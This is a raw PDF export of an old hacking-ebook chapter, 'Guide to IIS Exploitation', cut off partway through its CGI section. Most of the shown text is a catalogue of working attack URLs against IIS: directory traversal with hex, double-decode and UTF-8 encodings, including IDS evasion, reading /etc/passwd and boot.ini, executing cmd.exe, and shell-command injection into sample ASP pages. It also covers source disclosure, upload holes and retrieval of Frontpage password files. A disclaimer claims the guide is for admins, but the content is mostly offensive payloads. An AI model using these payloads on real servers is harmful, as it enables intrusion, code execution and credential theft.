%PDF-1.3
1 0 obj
<<
/CreationDate(D:20160204102509)
/Title()
/Author(PDFZilla)
/Keywords(PDFZilla,Zilla PDF)
/Producer(PDFZilla - Zilla TXT To PDF Converter)
>>
endobj
5 0 obj
[
750 750 278 278 355 556 556 889 667 190 333 333 389 584 278 333 
278 278 556 556 556 556 556 556 556 556 556 556 278 278 584 584 
584 556 1015 667 667 722 722 667 610 778 722 278 500 667 556 832 
722 778 667 778 722 667 610 722 667 944 667 667 610 278 278 278 
469 556 333 556 556 500 556 556 278 556 556 222 222 500 222 832 
556 556 556 556 333 500 278 556 500 722 500 500 500 334 260 334 
584 750 556 750 222 556 333 1000 556 556 333 1000 667 333 1000 750 
610 750 750 222 222 333 333 350 556 1000 333 1000 500 333 944 750 
500 667 278 333 556 556 556 556 260 556 333 736 370 556 584 333 
736 552 400 549 333 333 333 576 537 333 333 333 365 556 834 834 
834 610 667 667 667 667 667 667 1000 722 667 667 667 667 278 278 
278 278 722 722 778 778 778 778 778 584 778 722 722 722 722 667 
667 610 556 556 556 556 556 556 889 500 556 556 556 556 278 278 
278 278 556 556 556 556 556 556 556 549 610 556 556 556 556 500 
556 500 
]
endobj
6 0 obj
<<
/Type/FontDescriptor
/FontName/Arial
/Ascent 905
/Descent -212
/ItalicAngle 0
/CapHeight 905
/Flags 32
/FontBBox[0 0 0 0]
>>
endobj
7 0 obj
<<
/Type/Font
/Subtype/TrueType
/Name/F0
/BaseFont/Arial
/Encoding/WinAnsiEncoding
/FirstChar 30
/LastChar 255
/Widths 5 0 R
/FontDescriptor 6 0 R
>>
endobj
8 0 obj
<<
/Length 7989
>>
stream
BT
/F0 10 Tf
0 0 0 rg
28.346 804.491 Td
( ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 790.318 Td
(--------------------------------------------------------------------------------------------------------------) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 776.144 Td
(----------------------------------------------------------------------------------------------------) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 761.971 Td
( ///////////*1000+ HACKING TRICKS & TUTORIALS - ebook By Mukesh Bhardwaj Blogger  - Paid Version - only @ ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 747.798 Td
(TekGyd | itechhacks | Mukeshtricks4u*///////) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 733.625 Td
(--------------------------------------------------------------------------------------------------------------) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 719.451 Td
(----------------------------------------------------------------------------------------------------) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 705.278 Td
() Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 691.105 Td
() Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 676.932 Td
(***************************************************************************\n*                      Guide to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 662.759 Td
(IIS Exploitation                          *\n*                            by fugjostle                         ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 648.585 Td
(       *\n*                                                                         *\n*                        ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 634.412 Td
(    V.1.0.1                                     *\n*                                                           ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 620.239 Td
(             *\n*          Questions? Comments? Email: fugjostle at ch0wn.com             ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 606.066 Td
(*\n***************************************************************************\n\n    Disclaimer: I do not ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 591.892 Td
(condone hacking IIS servers in any way, \n                shape or form. This guide is intended as a guide \n   ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 577.719 Td
(            for admins to help them understand what most \n                script kiddies don't understand but ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 563.546 Td
(are happy to \n                exploit. \n\n\n--[On the first day, God created directory traversal]\n\nRelative ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 549.373 Td
(paths are the developers friend. They allow an entire website to \nbe moved to another directory without the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 535.199 Td
(need for changing all the links \nin the html. For example, lets say we have a webpage called 'pictures.html' ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 521.026 Td
(\nin the htdocs dir:\n\n  Absolute path:  /home/webpages/htdocs/pictures.html\n  Absolute path:  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 506.853 Td
(/home/webpages/images/pic1.gif\n\nIn the html you can refer to the 'pic1.gif' via an absolute path shown \nabove ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 492.68 Td
(or use a relative path:\n\n  Relative path: ../images/pic1.gif\n\nThe relative path tells the server that it has ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 478.507 Td
(to go to the parent \ndirectory \(dot dot\) -->  from /home/webpages/htdocs to /home/webpages. Then \nthe server ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 464.333 Td
(goes into the images dir and looks for the gif file to display.\n\nAnyone who has used the 'cd' command in DOS ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 450.16 Td
(and *nix should be familiar \nwith the operation. So what's the problem I hear you ask... well, the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 435.987 Td
(\nprogrammers of web server didn't think to check the supplied URL to ensure \nthat the requested file was ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 421.814 Td
(actually in the web directory. This allows \nsomeone to backtrack through the servers directory structure and ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 407.64 Td
(request \nfiles that the web server has access to. For example,\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 393.467 Td
(http://www.target.com/../../../etc/passwd\n\nNB. you can also use double dots and double quotes. This is useful ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 379.294 Td
(to evade\nIntrusion Detection Systems \(IDS\):\n\n  http://www.target.com//....//....//...././etc/./passwd\n\nThe ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 365.121 Td
(webserver simply strips the extra stuff out and processes the request.\nThis is the same as the previous ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 350.948 Td
(example and can make string matching IDS's\nwork for their money.\n\n\n--[On the second day, God created ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 336.774 Td
(Hexadecimal]\n\nOnce programmers started to realise the mistake they began to create parser \nroutines to check ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 322.601 Td
(for naughty URL's and keep the requests within the \ndocument root. Then along comes a wiley hacker who wonders) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 308.428 Td
(if by encoding \nthe URL will it still be recognised by the parser routines.\n\nYou may have noticed that when ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 294.255 Td
(you enter a URL that includes a space it is \nreplaced with the hex equivalent \(%20\):\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 280.081 Td
(http://www.target.com/stuff/my index.html\n\n  becomes\n\n  http://www.target.com/stuff/my%20index.html\n\nand ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 265.908 Td
(voila, it works. So what would happen if we changed the now denied URL:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 251.735 Td
(http://www.target.com/../../../etc/passwd\n\n  to\n\n  http://www.target.com/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n \nThe) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 237.562 Td
(parser routine checks for the existence of dots in the path and finds \nnone... the webserver then proceeds ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 223.388 Td
(with the request.\n\nAn interesting feature is that you can encode the hex symbol  and the web \nserver will ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 209.215 Td
(decode it all for you. This is called the "double decode". \nFor example, given the URL ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 195.042 Td
("http://victim.com/..%252f..%252fdocs/", the \nfollowing will take place:\n\n\(1\) On the first decode, the string ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 180.869 Td
(will be converted to:\n\n  "http://victim.com/..%2f..%2fdocs/"\n\n  [%25 = '%' so '%252f' is decoded to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 166.696 Td
('%2f']\n\n\(2\) On the second decode, the string will be converted to:\n\n  "http://victim.com/../../docs/"\n\n  [%2f ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 152.522 Td
(= '/']\n\n\n--[On the third day, God created Unicode]\n\nThe World Wide Web is a global phenomenon and as such ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 138.349 Td
(needs to be globally \ninteroperable. This raised the question of how to deal with all the different \ncharacter) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 124.176 Td
(sets around the world. As a response to this, Unicode was created:\n\n   ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 110.003 Td
(-----------------------------------------------------------------\n   Unicode provides a unique number for ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 95.829 Td
(every character, no matter \n   what the platform, no matter what the program, no matter what \n   the language.) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 81.656 Td
(The Unicode Standard has been adopted by such \n   industry leaders as Apple, HP, IBM, JustSystem, Microsoft, \n) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 67.483 Td
(  Oracle,SAP, Sun, Sybase, Unisys and many others. Unicode is \n   required by modern standards such as XML, ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 53.31 Td
(Java, ECMAScript \n   \(JavaScript\), LDAP, CORBA 3.0, WML, etc., and is the official \n   way to implement ) Tj
ET
endstream
endobj
9 0 obj
<<
/Type/Page
/Parent 2 0 R
/MediaBox[ 0 0 595.276 841.89 ]
/Contents 8 0 R
>>
endobj
10 0 obj
<<
/Length 8470
>>
stream
BT
/F0 10 Tf
0 0 0 rg
28.346 804.491 Td
(ISO/IEC 10646. It is supported in many operating \n   systems, all modern browsers, and many other products.\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 790.318 Td
(-----from http://www.unicode.org---------------------------------\n\n\nThe problem with Unicode is that it ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 776.144 Td
(requires 16 bits for a single character \nand software tended to use 8 bits for a single character. Unicode ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 761.971 Td
(TransForm \nusing 8 bits \(UTF-8\) was created. This allows for multibyte encoding where a \nvariable number of ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 747.798 Td
(bytes can be used for each character:\n\n  Character  1-byte  2-byte  3-byte \n   .         2E      C0 AE   E0 80) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 733.625 Td
(AE \n   /         2F      C0 AF   E0 80 AF \n   \\         5C      C1 9C   E0 81 9C \n\nThis lead to a new ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 719.451 Td
(vulnerability in certain webservers. The parser didn't \nunderstand this new encoding and allowed it through ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 705.278 Td
(:-\)\n\nFor example:\n\n  www.target.com/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd\n\nRecent vulnerabilities ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 691.105 Td
(have been taking advantage of the fact that the web \nserver doesn't understand the Unicode UTF-8 character set) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 676.932 Td
(but the underlying \nOS does:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 662.759 Td
(www.target.com/scripts/..%c0%af../winnt/system32/cmd.exe?/c%20dir\n\nUnderstanding the distinction between ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 648.585 Td
(Unicode and UTF-8 can be difficult. As\na general rule of thumb you can use the following format as a guide:\n\n ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 634.412 Td
(%uxxxx          = Unicode\n  %xx%xx          = UTF-8\n  %xx             = Hexidecimal\n  %xxxx           = Double) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 620.239 Td
(Decode\n\n--[On the fourth day, God created default installs]\n\nIIS comes installed with various DLL's \(Dynamic ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 606.066 Td
(Link Libraries\) that \nincrease the functionality of the web server. These ISAPI \(Internet Server \nAPI\) ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 591.892 Td
(applications allow programmers/developers to deliver more functionality \nto IIS.\n\nThe DLL's are loaded into ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 577.719 Td
(memory at startup and offer significant speed \nover traditional CGI programs. For example, they can be ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 563.546 Td
(combined with the \nInternet Database Connector \(httpodbc.dll\) to create interactive sites that \nuse ODBC to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 549.373 Td
(access databases.\n\nThe problem is that some of these DLL's are insecure and are often installed \nwith sample ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 535.199 Td
(scripts that demonstrate how to exploit, erm, I mean use them.\n\nASP.DLL is used to pre-process requests that ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 521.026 Td
(end in ".asp". ASP \(Active \nServer Pages\) are basically HTML pages with embedded code that is processed \nby ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 506.853 Td
(the webserver before serving it to the client. \n\nHere's some examples to illustrate how the sample pages ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 492.68 Td
(installed by default\ncan aid someone breaking into your site via the ASP.DLL:\n[prefix all the examples with ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 478.507 Td
(http://www.target.com]\n\n  /default.asp.\n\n   ** Appending a '.' to the URL can reveal the source \n   ** on ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 464.333 Td
(older systems. Remember hex encoding? You can \n   ** also try using %2e to do the same thing.\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 450.16 Td
(/msadc/samples/adctest.asp\n\n   ** This gives you an interface into the msadcs.dll \n   ** and allows creation ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 435.987 Td
(of DSN's. Read RFP's stuff\n   ** for idea's on how to exploit this.\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 421.814 Td
(/iissamples/exair/howitworks/codebrws.asp?source=/msadc/Samples/../../.../../../../boot.ini\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 407.64 Td
(/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/../../../../.../boot.ini\n\n   ** You can view the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 393.467 Td
(source of anything in the \n   ** document root. '/msadc/' needs to be in the \n   ** request as it is checked ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 379.294 Td
(for, wait for this,\n   ** security :-\)\n\n  /index.asp::$DATA\n\n   ** Appending '::$DATA' to the URL can reveal\n ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 365.121 Td
( ** the source of the ASP.\n\n  /index.asp%81\n  \n   ** Append a hex value between 0x81 and 0xfe\n   ** and you ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 350.948 Td
(can reveal the source of any server\n   ** processed file. This only works on servers\n   ** that are Chinese, ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 336.774 Td
(Japanese or Korean.\n\n  /AdvWorks/equipment/catalog_type.asp?ProductType=|shell\("cmd+/c+dir+c:\\"\)|\n\n   ** This ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 322.601 Td
(one allows you to execute remote\n   ** shell commands ;-\)\n\nISM.DLL is used to process requests that end in ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 308.428 Td
(".htr". These pages were used \nto administer IIS3 servers. In IIS4 they are not used but various .htr samples ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 294.255 Td
(\nare installed by default anyway and offer another avenue for entry.\n\n  /index.asp%20%20%20..\(220 ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 280.081 Td
(more\)..%20%20.htr\n\n   ** IIS will redirect this request to ISM.DLL,\n   ** which will strip the '.htr' ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 265.908 Td
(extension and\n   ** deliver the source code of the file.\n  \n  /global.asa+.htr\n\n   ** Does the same thing as ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 251.735 Td
(the %20%20 exploit\n   ** above. ISM.DLL strips the +.htr and delivers\n   ** you the source of the file\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 237.562 Td
(/scripts/iisadmin/ism.dll?http/dir\n\n   ** Excellent brute force opportunity if the\n   ** dll exists. ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 223.388 Td
(Successful logons will reveal\n   ** lots of useful stuff.\n\n  /iisadmpwd/aexp.htr\n\n   ** The iisadmpwd diectory) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 209.215 Td
(contains several .htr \n   ** files that allow NetBIOS resolution and \n   ** password attacks.\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 195.042 Td
(/scripts/iisadmin/bdir.htr??c:\\inetpub\\www\n\n   ** This method will only reveal directories\n   ** but can be ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 180.869 Td
(useful for identifying the \n   ** servers structure for more advanced \n   ** attacks later.\n\nMSADCS.DLL is ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 166.696 Td
(used to allow access to ODBC components via IIS using RDS \n\(Remote Data Service\). RDS is part of the default ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 152.522 Td
(install of Microsoft Data \nAccess Components \(MDAC\) and is a commonly exploited on IIS. It can allow\narbitrary) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 138.349 Td
(shell commands to be executed with system privileges.\n\n  /msadc/msadcs.dll\n\n   ** If this file exists then ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 124.176 Td
(there's a pretty \n   ** good chance that you can run the RDS \n   ** exploit again the box. More on this ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 110.003 Td
(later.\n\nHTTPODBC.DLL is the Internet Connector Database \(IDC\) and used when the web\nserver wants to connect to) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 95.829 Td
(a database. It allows the creation of web pages\nfrom data in the database, and it allows you to update/delete ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 81.656 Td
(items from \nwithin webpages. Pages with the extension '.idc' are sent to the HTTPODBC.DLL\nfor processing. \n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 67.483 Td
(/index.idc::$DATA\n\n   ** Appending '::$DATA' to the URL can reveal\n   ** the source of the IDC.\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 53.31 Td
(/anything.idc\n  \n   ** Requesting a non-existance file will\n   ** reveal the location of the web root.\n\n  ) Tj
ET
endstream
endobj
11 0 obj
<<
/Type/Page
/Parent 2 0 R
/MediaBox[ 0 0 595.276 841.89 ]
/Contents 10 0 R
>>
endobj
12 0 obj
<<
/Length 8492
>>
stream
BT
/F0 10 Tf
0 0 0 rg
28.346 804.491 Td
(/scripts/iisadmin/tools/ctss.idc\n\n   ** Creates a table based on the parameters it \n   ** receives. Excellent ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 790.318 Td
(place to look at for \n   ** SQL injection.\n\nSSINC.DLL is used for processing Server Side Includes \(SSI\). ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 776.144 Td
('.stm', \n'.shtm' and '.shtml' extension are sent to the DLL which interprets\nthe SSI statements within the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 761.971 Td
(HTML before sending it to the client.\n\nAn example of SSI would be:\n\n  <!--#include file="news.txt"-->\n\nThis ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 747.798 Td
(SSI tells the server to include the 'news.txt' in the final HTML \nsent to the use. SSI statements are beyond ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 733.625 Td
(the scope of this document \nbut offer another security hole open to our wiley hax0r. Ensure you \nremove the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 719.451 Td
(app mapping and disable SSI if you do not require its \nfunctionality.\n\nSSINC.DLL is also vulnerable to a ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 705.278 Td
(remote buffer overflow, read the \nfollowing advisory for details:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 691.105 Td
(http://www.nsfocus.com/english/homepage/sa01-06.htm\n\nSome examples of SSINC.DLL fun:\n\n  /anything.stm\n\n   ** ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 676.932 Td
(If you request a file that doesn't exist\n   ** then the server error message contains the\n   ** the location ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 662.759 Td
(of the web root.\n\n  /somedir/anything.stm/somedir/index.asp\n\n   ** Using this method allows you to view the\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 648.585 Td
(** the source code for index.asp. \n  \nIDQ.DLL is a component of MS Index Server and handles '.ida' and ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 634.412 Td
('.idq'\nrequests. This DLL has had some big exposure with the recent Nimda worm. \nI'm not going into too much ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 620.239 Td
(detail but '.ida' was used in a buffer \noverflow that resulted in user defined code being executed on the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 606.066 Td
(server.\n\n  /anything.ida or /anything.idq\n  \n   ** Requesting a non-existance file will\n   ** reveal the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 591.892 Td
(location of the web root.\n\n  /query.idq?CiTemplate=../../../boot.ini\n\n   ** You can use this to read any file ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 577.719 Td
(on\n   ** the same drive as the web root\n\nCPSHOST.DLL is the Microsoft Posting Acceptor. This allows uploads to) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 563.546 Td
(your \nIIS server, via a web browser or the Web Publishing Wizard. The existance of \nthis DLL can allow ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 549.373 Td
(attackers upload files to the server. Other files such as\nuploadn.asp, uploadx.asp, upload.asp and repost.asp ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 535.199 Td
(are installed with Site\nServer and allow upload of documents to the server:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 521.026 Td
(/scripts/cpshost.dll?PUBLISH?/scripts/dodgy.asp\n\n   ** If this file is there then you may be able\n   ** to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 506.853 Td
(upload files to the server.\n\n  /scripts/uploadn.asp\n  \n   ** Connecting to this page gives you a nice\n   ** ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 492.68 Td
(gui for uploading your own webpages. You\n   ** probably need to brute the userid.\n\nThere are lots more example) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 478.507 Td
(scripts in the default install and quite a few \nof them are very, very insecure. Microsoft recommends that you) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 464.333 Td
(remove ALL \nsamples from any production server including the ExAir, WSH, ADO and other \ninstalled samples.\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 450.16 Td
(IIS Default Web Site\n  --------------------\n  IISSAMPLES  - c:\\inetpub\\iissamples\n  IISADMIN    - ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 435.987 Td
(c:\\winnt\\system32\\inetsrv\\issadmin\n  IISHELP     - c:\\winnt\\help\n  SCRIPTS     - c:\\inetpub\\scripts\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 421.814 Td
(IISADMPWD   - c:\\winnt\\systems32\\inetsrv\\iisadmpwd\n  msadc       - c:\\program files\\common files\\system\\msadc\n) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 407.64 Td
( logfiles    - c:\\winnt\\system32\\logfiles\n  default.htm - c:\\inetpub\\wwwroot\n\n  IIS Default App Mapping\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 393.467 Td
(-----------------------\n  .asa   - c:\\winnt\\system32\\inetsrv\\asp.dll\n  .asp   - ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 379.294 Td
(c:\\winnt\\system32\\inetsrv\\asp.dll\n  .cdx   - c:\\winnt\\system32\\inetsrv\\asp.dll\n  .cer   - ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 365.121 Td
(c:\\winnt\\system32\\inetsrv\\asp.dll\n  .htr   - c:\\winnt\\system32\\inetsrv\\ism.dll\n  .idc   - ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 350.948 Td
(c:\\winnt\\system32\\inetsrv\\httpodbc.dll\n  .shtm  - c:\\winnt\\system32\\inetsrv\\ssinc.dll\n  .shtml - ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 336.774 Td
(c:\\winnt\\system32\\inetsrv\\ssinc.dll\n  .stm   - c:\\winnt\\system32\\inetsrv\\ssinc.dll\n\n\n--[On the fifth day, God ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 322.601 Td
(created Frontpage Extensions]\n\nMicrosoft Frontpage \(Originally developed by Vermeer Tech Inc, if you've \never ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 308.428 Td
(wondered why they use _vti_\) is a web design tool that helps you \ncreate and maintain a web site and allows ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 294.255 Td
(you to publish it to the web \nserver. \n\nIn order to publish using Frontpage the server needs to run certain ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 280.081 Td
(\nprograms, collectively called the Frontpage Server Extensions.\n\nSounds good I hear you say, but there are ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 265.908 Td
(many, many security holes in \nFrontpage. You can list all the files, download password files and upload \nyour ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 251.735 Td
(own files on Frontpage enabled sites.\n\nWhen you publish a file, Frontpage attempts to read the following URL ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 237.562 Td
(to \nget all the information it needs to publish:\n\n  http://www.myserver.com/_vti_inf.html\n\nThen Frontpage uses) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 223.388 Td
(the following URL to POST the files to the site:\n\n  http://www.myserver.com/_vti_bin/shtml.exe/_vti_rpc\n\nIt ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 209.215 Td
(will come as no surprise that this file is not protected and open to \nabuse.\n\nAll information for the site is ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 195.042 Td
(stored in the /_vti_pvt/ dir, and its world \nreadable. Here's some of the things you can look for:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 180.869 Td
(http://www.myserver.com/_vti_pvt/administrators.pwd\n  http://www.myserver.com/_vti_pvt/authors.pwd\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 166.696 Td
(http://www.myserver.com/_vti_pvt/service.pwd\n  http://www.myserver.com/_vti_pvt/shtml.dll\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 152.522 Td
(http://www.myserver.com/_vti_pvt/shtml.exe\n  http://www.myserver.com/_vti_pvt/users.pwd\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 138.349 Td
(http://www.myserver.com/_private\n\n\n--[On the sixth day, God created CGI]--\n\nThe Common Gateway Interface \(CGI\)) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 124.176 Td
(is a standard for interfacing external \napplications to the web server. A CGI program is excuted in real time ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 110.003 Td
(and \nis used to create dynamic web sites.\n\nGenerally, the CGI programs are kept in '/cgi-bin/' but can be ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 95.829 Td
(placed \nanywhere. The programs can be written most languages but typically they are \nwritten in C, Perl or ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 81.656 Td
(shell scripts.\n\nMany sites will use freely available, downloadable scripts from places like \nMatt's Trojan, ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 67.483 Td
(erm, I mean Matt's Script Archive. Its always a good idea to \nlook through the source of the scripts for bad ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 53.31 Td
(system calls and lax input \nvalidation.\n\nCGI deserves a tutorial all to itself and I strongly suggest that you) Tj
ET
endstream
endobj
13 0 obj
<<
/Type/Page
/Parent 2 0 R
/MediaBox[ 0 0 595.276 841.89 ]
/Contents 12 0 R
>>
endobj
14 0 obj
<<
/Length 8469
>>
stream
BT
/F0 10 Tf
0 0 0 rg
28.346 804.491 Td
(read \nthe following tutorials... they explain it better than I ever could:\n\n  Hacking CGI       - ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 790.318 Td
